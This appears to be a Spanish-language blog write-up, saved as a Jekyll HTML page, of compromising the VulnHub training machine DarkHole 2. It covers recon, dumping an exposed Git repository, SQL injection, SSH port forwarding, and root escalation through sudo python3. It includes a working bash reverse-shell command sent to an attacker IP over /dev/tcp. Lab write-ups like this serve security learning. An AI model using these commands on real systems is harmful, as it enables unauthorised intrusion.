@@ -1,0 +1,841 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Dark hole 2 VulnHub Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Dark hole 2 de VulnHub">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Dark hole 2 VulnHub Write-up">
+<meta property="og:url" content="http://localhost:4000/DarkHole_2/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Dark hole 2 de VulnHub">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/VulnHub/vulnhub_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-22T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/DarkHole_2/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Dark hole 2 VulnHub Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Dark hole 2 VulnHub Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Dark hole 2 de VulnHub">
+    <meta itemprop="datePublished" content="February 22, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Dark hole 2 VulnHub Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-22T00:00:00-05:00">February 22, 2023 </time>&emsp;
+          
+          
+        </p>
+        <h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>VulnHub</strong> llamada <strong>DarkHole 2</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Reconocimiento del sistema.</li>
+  <li>Enumeración de proyecto Git.</li>
+  <li>SQLi.</li>
+  <li>Local Port Forwarding utilizando ssh.</li>
+  <li>Abuso de servidor web.</li>
+  <li>Información fitrada (bash history).</li>
+  <li>Abuso de privilegio de Sudoers.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 192.168.233.130
+
+PING 192.168.233.130 (192.168.233.130) 56(84) bytes of data.
+64 bytes from 192.168.233.130: icmp_seq=1 ttl=64 time=0.266 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS -open 192.168.233.130 -oG Port
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sCV -p22,80 192.168.223.130 -Pn -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 57b1f564289891516d70766ea552435d (RSA)
+|   256 cc64fd7cd85e488a289891b9e41e6da8 (ECDSA)
+|_  256 9e7708a4529f338d9619ba757127bd60 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-git: 
+|   192.168.233.130:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: i changed login.php file for more secure 
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: DarkHole V2
+</code></pre></div></div>
+
+<p>Observamos un servicio http, el cual tiene un repositorio de Git, vamos a utilizar whatweb para enumerar información:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 192.168.233.130
+http://192.168.233.130 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.233.130], Title[DarkHole V2]
+</code></pre></div></div>
+
+<p>Vamos a ver la web:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole1.png" alt="" /></p>
+
+<p>Tenemos un panel de login, vamos a verlo:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole2.png" alt="" /></p>
+
+<p>Antes de realizar intentos de SQLi, vamos a revisar el directorio .git:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole3.png" alt="" /></p>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Vamos a traernos el proyecto a nuestro equipo utilizando <code class="language-plaintext highlighter-rouge">git_dumper</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 git_dumper.py http://192.168.233.130/.git darkhole2
+[-] Testing http://192.168.233.130/.git/HEAD [200]
+[-] Testing http://192.168.233.130/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://192.168.233.130/.git/ [200]
+[-] Fetching http://192.168.233.130/.gitignore [404]
+[-] http://192.168.233.130/.gitignore responded with status code 404
+[-] Fetching http://192.168.233.130/.git/hooks/ [200]
+[-] Fetching http://192.168.233.130/.git/logs/ [200]
+[-] Fetching http://192.168.233.130/.git/HEAD [200]
+</code></pre></div></div>
+<p>Cuando termine, entramos a la carpeta que ha creado:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
+config  dashboard.php  index.php  js  login.php  logout.php  style
+</code></pre></div></div>
+<p>Observamos todos los archivos del proyecto, si los revisamos encontraremos el panel de login:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">session_start</span><span class="p">();</span>
+<span class="k">require</span> <span class="s1">'config/config.php'</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">){</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nf">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$connect</span><span class="p">,</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]));</span>
+    <span class="nv">$pass</span> <span class="o">=</span> <span class="nf">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$connect</span><span class="p">,</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+    <span class="nv">$check</span> <span class="o">=</span> <span class="nv">$connect</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"select * from users where email='</span><span class="nv">$email</span><span class="s2">' and password='</span><span class="nv">$pass</span><span class="s2">' and id=1"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$check</span><span class="o">-&gt;</span><span class="n">num_rows</span><span class="p">){</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"location:dashboard.php"</span><span class="p">);</span>
+        <span class="k">die</span><span class="p">();</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>El cual implementa funciones para evitar las injecciones.</p>
+
+<p>Pero no encontramos más información, sin embargo, como es un proyecto de git vamos a ver si existen logs:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -&gt; master)
+Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
+Date:   Mon Aug 30 13:14:32 2021 +0300
+
+    i changed login.php file for more secure
+
+commit a4d900a8d85e8938d3601f3cef113ee293028e10
+Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
+Date:   Mon Aug 30 13:06:20 2021 +0300
+
+    I added login.php file with default credentials
+
+commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
+Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
+Date:   Mon Aug 30 13:02:44 2021 +0300
+
+    First Initialize
+</code></pre></div></div>
+
+<p>Si existen, vemos un commit que dice que ha agregado al login una cuenta con credenciales por defecto, vamos a ver de que se trata:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git show a4d900a8d85e8938d3601f3cef113ee293028e10
+
+commit a4d900a8d85e8938d3601f3cef113ee293028e10
+Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
+Date:   Mon Aug 30 13:06:20 2021 +0300
+
+    I added login.php file with default credentials
+
+diff --git a/login.php b/login.php
+index e69de29..8a0ff67 100644
+--- a/login.php
++++ b/login.php
+@@ -0,0 +1,42 @@
++&lt;?php
++session_start();
++require 'config/config.php';
++if($_SERVER['REQUEST_METHOD'] == 'POST'){
++    if($_POST['email'] == "lush@admin.com" &amp;&amp; $_POST['password'] == "321"){
++        $_SESSION['userid'] = 1;
++        header("location:dashboard.php");
++        die();
++    }
+</code></pre></div></div>
+
+<p>Vemos unas credenciales, vamos a probarlas en el panel de login.</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole4.png" alt="" /></p>
+
+<p>Al ingresar vemos:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole5.png" alt="" /></p>
+
+<p>Vemos un panel, vamos a intentar algunas injecciones para ver si es vulnerable:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole6.png" alt="" /></p>
+
+<p>Sin embargo, no logramos nada.</p>
+
+<p>En la URL podemos ver que se está utilizando un id para identificar el usuario, vamos a probar uno diferente:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole7.png" alt="" /></p>
+
+<p>Vemos que si, vamos a analizar esto mejor en <code class="language-plaintext highlighter-rouge">burpsuite</code>:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole8.png" alt="" /></p>
+
+<p>Como podemos saltar de id en id, tenemos un posible campo de injección, asi que vamos a probar SQLi:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole9.png" alt="" /></p>
+
+<p>Vemos que al agregar una comilla, da página da error, vamos a probar a enumerar las columnas:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole10.png" alt="" /></p>
+
+<p>Vemos que ha dado error, vamos a ir bajando el valor de las columnas. (en URL encode porque es una dirección url y no funciona en caso contrario.)</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole11.png" alt="" /></p>
+
+<p>Luego de ir bajando el valor llegamos a 6, en el cual ya no da error. Por lo tanto, nos hace pensar que este es el número de columnas que tiene la tabla, vamos a probarlo:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole12.png" alt="" /></p>
+
+<p>Vemos que ha funcionado, dentro de los imput se ven reflejados los numeros que hemos seleccionado, por lo tanto, vamos a enumerar la base de datos:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole13.png" alt="" /></p>
+
+<p>Vemos que la base de datos se llama darkhole_2, vamos a enumerar las tablas:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole14.png" alt="" /></p>
+
+<p>Observamos que hay una tabla llamada ssh, vamos a ver las columnas que tiene:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole15.png" alt="" /></p>
+
+<p>Vemos que hay una columna id, sin embargo, nos hace pensar que falta información, para ello utilizaremos group_concat para forzar a que toda la información aparezca en la misma linea:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole16.png" alt="" /></p>
+
+<p>Vemos que existen las columnas id, user y pass, vamos a extraer la información:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole17.png" alt="" /></p>
+
+<p>Tenemos unas credenciales <strong>jehad</strong> y passowrd <strong>fool</strong>, como la tabla se llama ssh nos hace pensar que corresponde a un usuario válido, vamos a probarlo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh jehad@192.168.233.130
+
+jehad@darkhole:~$ whoami
+jehad
+</code></pre></div></div>
+
+<p>Logramos iniciar sesión correctamente por ssh en la máquina.</p>
+
+<p>Vamos a buscar la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jehad@darkhole:/home/losy$ cat user.txt 
+DarkHole{'This_is_the_life_man_better_than_a_cruise'}
+</code></pre></div></div>
+
+<p>¡Bien!, tenemos la flag de usuario, ahora vamos a escalar privilegios.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Vamos a empezar enumerando nuestro grupo y privilegios:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jehad@darkhole:/home/losy$ id
+uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
+</code></pre></div></div>
+<p>Para los permisos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jehad@darkhole:/home/losy$ sudo -l
+[sudo] password for jehad: 
+Sorry, user jehad may not run sudo on darkhole.
+</code></pre></div></div>
+<p>Pero no encontramos nada. Si buscamos por binarios SUID:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jehad@darkhole:/home/losy$ find / -perm 4000 2&gt;/dev/null
+jehad@darkhole:/home/losy$
+</code></pre></div></div>
+<p>No tenemos nada, vamos a buscar por tareas cron:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+* * * * * root service apache2 start &amp;&amp; service mysql start
+* * * * * losy  cd /opt/web &amp;&amp; php -S localhost:9999
+</code></pre></div></div>
+
+<p>Y vemos algo interesante, tenemos lo que parece ser un servidor web por el puerto 9999 por parte de losy, vamos a traernos este puerto a nuestro equipo para ver de que se trata, esto lo haremos haciendo port forwarding utilizando ssh:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 9999:127.0.0.1:9999 jehad@192.168.233.130
+</code></pre></div></div>
+<p>De esta forma, convertimos nuestro puerto 9999 en el puerto de la máquina víctima, vamos a ver que es:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole18.png" alt="" /></p>
+
+<p>Vemos que pide un parámetro cmd, al parecer podemos ingresar comandos:</p>
+
+<p><img src="/imagenes/DarkHole2/darkhole19.png" alt="" /></p>
+
+<p>Tenemos entonces, una forma de ejectuar comandos como el usuario losy, vamos a ganar acceso como losy:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:9999/?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/192.168.233.129/1234 0&gt;%261'
+</code></pre></div></div>
+
+<p>Vamos a enviarnos una bash hacia nuestra máquina, utilizando el /dev/tcp, con ello entonces vamos a estar escuchando por netcat por el puerto 1234:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.233.128] from (UNKNOWN) [192.168.233.130] 55314
+bash: cannot set terminal process group (1266): Inappropriate ioctl for device
+bash: no job control in this shell
+losy@darkhole:/opt/web$ whoami  
+whoami
+losy
+</code></pre></div></div>
+
+<p>Hemos ganado acceso como el usuario losy, vamos a arreglar la bash:</p>
+
+<ul>
+  <li>script /dev/null -c bash</li>
+  <li>control + z</li>
+  <li>stty ray -echo; fg</li>
+  <li>reset xterm</li>
+  <li>export TERM=xterm</li>
+  <li>export SHELL=bash</li>
+  <li>stty rows X columns Y (dependiendo de tu stty size)</li>
+</ul>
+
+<p>Con esto listo, ya podemos movernos con comodidad.</p>
+
+<p>Si nos vamos al directorio personal de losy, encontraremos algo interesante:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>losy@darkhole:~$ ls -la
+total 36
+drwxr-xr-x 4 losy losy 4096 Feb 24 16:44 .
+drwxr-xr-x 5 root root 4096 Sep  2  2021 ..
+-rw------- 1 losy losy 1123 Sep  3  2021 .bash_history
+-rw-r--r-- 1 losy losy  220 Sep  2  2021 .bash_logout
+-rw-r--r-- 1 losy losy 3771 Sep  2  2021 .bashrc
+drwx------ 2 losy losy 4096 Sep  2  2021 .cache
+drwxrwxr-x 3 losy losy 4096 Sep  3  2021 .local
+-rw-r--r-- 1 losy losy  807 Sep  2  2021 .profile
+-rw-rw-r-- 1 losy losy   55 Sep  3  2021 user.txt
+</code></pre></div></div>
+
+<p>Vemos el bash history, si le echamos un ojo y vamos revisando las lineas encontramos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>P0assw0rd losy:gang
+</code></pre></div></div>
+
+<p>Parece ser la contraseña de losy, vamos a intentar cambiar de usuario:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jehad@darkhole:/home/losy$ su losy
+Password: 
+losy@darkhole:~$ whoami
+losy
+</code></pre></div></div>
+
+<p>Ahora nos hemos convertido en losy, y tenemos sus credenciales, vamos a ver los privilegios que tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>losy@darkhole:~$ sudo -l
+[sudo] password for losy: 
+Matching Defaults entries for losy on darkhole:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User losy may run the following commands on darkhole:
+    (root) /usr/bin/python3
+</code></pre></div></div>
+
+<p>Podemos ejecutar python con privilegios, esto es crítico, pues podemos ganar acceos al sistema como root facilmente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>losy@darkhole:~$ sudo /usr/bin/python3
+Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.system("bash -p")
+root@darkhole:/home/losy# whoami
+root
+root@darkhole:/home/losy# 
+</code></pre></div></div>
+<p>Nos hemos convertido en root, pues mediante python utilizando la librería os podemos ejecutar comandos en el sistema.</p>
+
+<p>Vamos a buscar la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkhole:~# cat root.txt 
+DarkHole{'Legend'}
+</code></pre></div></div>
+
+<p>¡Listo!, hemos terminado la intrusión.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#abusing-sudoers" class="page__taxonomy-item" rel="tag">Abusing sudoers</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#git" class="page__taxonomy-item" rel="tag">Git</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#information-leakage" class="page__taxonomy-item" rel="tag">Information leakage</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#port-forwarding" class="page__taxonomy-item" rel="tag">Port Forwarding</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#vulnhub" class="page__taxonomy-item" rel="tag">VulnHub</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-22T00:00:00-05:00">February 22, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/DarkHole_1/" class="pagination--pager" title="Dark hole 1 VulnHub Write-up
+">Previous</a>
+    
+    
+      <a href="/Epsilon/" class="pagination--pager" title="Epsilon HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
